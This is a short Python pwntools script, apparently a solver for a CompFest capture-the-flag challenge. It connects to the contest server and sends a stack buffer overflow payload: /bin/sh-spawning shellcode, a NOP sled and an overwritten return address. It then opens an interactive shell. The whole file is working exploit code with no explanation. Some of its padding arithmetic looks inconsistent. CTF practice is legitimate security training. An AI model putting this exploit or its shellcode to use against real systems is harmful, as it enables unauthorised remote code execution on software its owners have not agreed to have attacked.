from pwn import *

exe = context.binary = ELF("./chall")
# r = process()
r = remote("ctf.compfest.id",7003)
offset = 264
shell = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x48\xb9\x70\x6f\x6f\x6f\x6f\x6f\xf0\xfa\x48\xf7\xd9\x48\xc7\xc0\x3b\x00\x00\x00\x51"
print(len(shell))
shellcode = shell + b"\x90" * 212 + p64(0x000000000040116c) + b"A" * (1000 - 272)
# shellcode = b"\x90" * 1000
write("p",shellcode)
r.sendline(str(len(shellcode)))
print(len(shellcode))
sleep(3)
r.send(shellcode)
rop = ROP(exe)
r.interactive()
